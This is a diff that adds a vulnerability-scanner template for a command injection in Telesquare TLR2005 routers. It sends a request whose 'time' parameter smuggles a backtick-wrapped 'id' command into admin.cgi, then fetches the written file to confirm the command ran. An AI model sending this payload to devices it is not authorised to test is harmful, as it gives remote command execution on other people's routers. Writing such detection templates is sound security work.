@@ -1,0 +1,51 @@
+id: telesquare-tlr2005-cgi-bin-command-injection
+info:
+  name: Telesquare TLR2005 CGI-Bin Command Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: command-injection
+  metadata:
+    finger: telesquare
+    fofa: app="TELESQUARE-TLR-2005KSH"
+
+variables:
+  t1: "{{rand_text_alpha(4)}}"
+
+http:
+  - id: check-sync-command
+    method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/admin.cgi?Command=setSyncTimeHost&time=`id>{{t1}}.txt`"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<result>success</result>"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+
+  - id: verify-command-execution
+    method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/{{t1}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "uid="
+          - "gid="
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
